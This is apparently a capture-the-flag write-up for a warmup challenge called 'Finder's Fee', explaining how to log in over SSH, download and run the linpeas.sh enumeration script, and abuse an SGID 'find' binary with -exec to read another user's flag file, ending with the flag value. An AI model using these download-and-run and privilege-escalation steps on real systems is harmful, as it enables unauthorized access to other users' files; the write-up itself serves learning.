+++
title = "Finder's Fee"
description = "You gotta make sure the people who find stuff for you are rewarded well!\n\nEscalate your privileges and uncover the flag.txt in the finder user's home directory.\n\nPress the Start button in the top-right to begin this challenge.\nConnect with:\n\n# Password is \"userpass\"\nssh -p 30668 user@challenge.ctf.games"
authors = ["mango", "Tyr", "cstef"]
date = 2024-09-30

[taxonomies]
categories = ["warmups"]
+++

## Description

You gotta make sure the people who find stuff for you are rewarded well!

Escalate your privileges and uncover the flag.txt in the finder user's home directory.

Press the Start button in the top-right to begin this challenge.

----

First, we need to connect to the machine via SSH with the following command:

```bash
# Password is "userpass"
ssh -p <port> user@challenge.ctf.games
```

At this point, we are connected as `user`, and we know the `flag.txt` file is located in the `finder` user's home directory (`/home/finder/flag.txt`).
It appears that we can use `wget`, so let's download `linpeas.sh` to help identify potential privilege escalation vectors:

```bash
wget -q https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

However, the machine crashes consistently when running `linpeas.sh`. To avoid this, we can disable some of the more resource-intensive checks and try again:

```bash
./linpeas.sh -o interesting_files,users_information,software_information,interesting_perms_files
```

Upon running this, we found a privilege escalation opportunity involving the `find` command, which has the `SGID` bit set with the user `finder`.

![](https://i.imgur.com/bSv4Edv.png)

Using this, we can read the `flag.txt` file with the following command:

```bash
find /home/finder/flag.txt -exec cat {} \;
```

The flag is: `flag{5da1de289823cfc200adf91d6536d914}`